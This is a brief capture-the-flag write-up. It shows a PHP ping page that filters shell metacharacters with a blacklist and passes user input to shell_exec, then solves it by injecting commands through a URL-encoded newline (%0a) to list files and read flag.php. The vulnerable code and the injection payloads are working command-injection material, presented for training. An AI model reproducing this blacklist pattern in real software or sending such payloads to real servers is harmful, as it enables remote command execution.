# Challenge
```php 
<?php
if(isset($_REQUEST[ 'ip' ])) {
    $target = trim($_REQUEST[ 'ip' ]);
    $substitutions = array(
        '&'  => '',
        ';'  => '',
        '|' => '',
        '-'  => '',
        '$'  => '',
        '('  => '',
        ')'  => '',
        '`'  => '',
        '||' => '',
    );
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
    $cmd = shell_exec( 'ping  -c 4 ' . $target );
        echo $target;
    echo  "<pre>{$cmd}</pre>";
}
show_source(__FILE__);
```
# Solution 
%0a 即可绕过
```
http://XXXX:83/index.php?ip=127.0.0.1%0als
```

```
http://XXXX:83/index.php?ip=127.0.0.1%0acat flag.php
```

# Refference 
+ [“春秋杯”web-writeup](https://chybeta.github.io/2017/06/18/%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9Dweb-writeup/#WEB-03)